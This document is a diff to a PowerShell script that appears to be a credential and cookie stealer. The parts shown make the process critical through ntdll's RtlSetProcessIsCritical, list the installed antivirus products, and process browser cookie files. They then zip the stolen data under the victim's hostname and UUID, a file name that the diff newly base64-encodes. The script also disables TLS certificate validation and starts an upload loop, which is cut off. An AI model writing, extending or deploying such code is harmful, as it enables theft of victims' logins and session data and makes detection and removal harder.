@@ -8,8 +8,7 @@
 #$write_disk_only = $false
 #$vm_protect = $false
 #$encryption_key = "YOUR_ENC_KEY_HERE"
-$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
-[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
+[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -24,7 +23,7 @@ Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http,
 
 # Critical Process
 function CriticalProcess {
-    param ([Parameter(Mandatory=$true)][string]$MethodName,[Parameter(Mandatory=$true)][uint32]$IsCritical,[uint32]$Unknown1,[uint32]$Unknown2)
+    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
     [System.Diagnostics.Process]::EnterDebugMode() 
     $domain = [AppDomain]::CurrentDomain
     $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
@@ -32,19 +31,20 @@ function CriticalProcess {
     $module = $assembly.DefineDynamicModule('DynamicModule')
     $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
     $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
-    [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
-    [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
-    [System.Runtime.InteropServices.CallingConvention]::Winapi,
-    [System.Runtime.InteropServices.CharSet]::Ansi)
+        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
+        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
+        [System.Runtime.InteropServices.CallingConvention]::Winapi,
+        [System.Runtime.InteropServices.CharSet]::Ansi)
     $type = $typeBuilder.CreateType()
     $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
     function InvokeRtlSetProcessIsCritical {
-        param ([uint32]$isCritical,[uint32]$unknown1,[uint32]$unknown2)
+        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
         $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
     }
     if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
         InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
-    } else {
+    }
+    else {
         Write-Host "Unknown method name: $MethodName"
     }
 }
@@ -216,8 +216,8 @@ function Backup-Data {
     }
     $avlist = Get-InstalledAV | Format-Table | Out-String
     
-    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
-    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
+    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[0]
+    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[2]  
     $split = "x"
     $screen = "$width" + "$split" + "$height"
 
@@ -1095,7 +1095,13 @@ function Backup-Data {
     }
     ProcessCookieFiles 
 
-    $zipFileName = "$uuid`_$countrycode`_$hostname`_$filedate`_$timezoneString.zip"
+    $b64_uuid = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($uuid))
+    $b64_countrycode = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($countrycode))
+    $b64_hostname = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hostname))
+    $b64_filedate = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($filedate))
+    $b64_timezoneString = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($timezoneString))
+    #$zipFileName = "$uuid`_$countrycode`_$hostname`_$filedate`_$timezoneString.zip"
+    $zipFileName = "$b64_uuid`_$b64_countrycode`_$b64_hostname`_$b64_filedate`_$b64_timezoneString.zip"
     $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"
 
     Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
@@ -1103,15 +1109,15 @@ function Backup-Data {
     Write-Host $ZipFilePath
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     if ( -not ($write_disk_only)) {    
-    class TrustAllCertsPolicy : System.Net.ICertificatePolicy {
-    [bool] CheckValidationResult([System.Net.ServicePoint] $a,
-                                 [System.Security.Cryptography.X509Certificates.X509Certificate] $b,
-                                 [System.Net.WebRequest] $c,
-                                 [int] $d) {
-           return $true
-         }
-     }
-     [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()
+        class TrustAllCertsPolicy : System.Net.ICertificatePolicy {
+            [bool] CheckValidationResult([System.Net.ServicePoint] $a,
+                [System.Security.Cryptography.X509Certificates.X509Certificate] $b,
+                [System.Net.WebRequest] $c,
+                [int] $d) {
+                return $true
+            }
+        }
+        [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()
         $went_through = $false
         while (-not $went_through) {
             try {
